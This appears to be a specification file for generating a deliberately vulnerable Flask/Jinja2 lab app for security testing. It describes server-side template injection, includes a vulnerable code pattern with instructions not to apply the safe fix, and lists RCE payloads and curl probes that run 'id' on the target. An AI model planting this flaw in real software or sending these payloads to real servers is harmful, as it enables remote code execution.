---
id: ssti_jinja2
type: web_vulnerability
description: A server-side template injection vulnerability in a Flask/Jinja2 application where user input is rendered directly through the Jinja2 template engine, allowing arbitrary Python execution and RCE.
required_vars: []
---
# Atom: Server-Side Template Injection (Jinja2 / Flask)

User-controlled input is passed to Jinja2's `render_template_string()` or rendered inline within a template expression without sanitization. The attacker injects Jinja2 template syntax to traverse Python internals and achieve remote code execution.

**This atom is Flask/Jinja2 specific.** There is no PHP or Node.js equivalent — use `cmd_injection` for RCE in those runtimes.

### Logic Requirements:
1. User input is passed directly into `render_template_string(user_input)` or embedded into a Jinja2 template string before rendering.
2. No sandboxing, escaping, or `SandboxedEnvironment` is used.
3. Jinja2 template delimiters (`{{ }}`, `{% %}`) are processed and evaluated as code.
4. The rendered output is returned in the HTTP response.

### Synthesis Guidance:
The vulnerable endpoint is typically a search results page, a personalised greeting, or a name/message renderer — any feature that reflects user input back in the page. The key mistake is calling `render_template_string()` with the user-supplied string directly instead of using it as a variable in a safe template.

**Vulnerable pattern (Flask):**
```python
from flask import Flask, request, render_template_string

@app.route('/search')
def search():
    query = request.args.get('q', '')
    # VULNERABLE: user input treated as template code
    return render_template_string(f"<h1>Results for: {query}</h1>")
```

**Safe pattern (for contrast — do NOT implement this in the vulnerable app):**
```python
return render_template_string("<h1>Results for: {{ query }}</h1>", query=query)
```

**Detection payload:** `{{7*7}}` → response contains `49`
**RCE payload:** `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`

A simpler RCE payload using config traversal:
`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`

### Testing Guidance:
**Layer 1 — Internal state check:**
Confirm template evaluation occurs with a benign arithmetic payload:
```bash
curl -s "http://localhost/search?q={{7*7}}"
```
The response must contain `49` (not the literal string `{{7*7}}`), confirming Jinja2 evaluated the expression.

**Layer 2 — External attack probe (from attacker container):**
```bash
# Confirm SSTI with arithmetic evaluation
curl -s "http://target/search?q=%7B%7B7*7%7D%7D" | grep "49"

# Execute arbitrary command
curl -s "http://target/search?q=%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('id').read()%7D%7D"
```
A successful result shows `uid=` output from the `id` command embedded in the response body, confirming RCE.
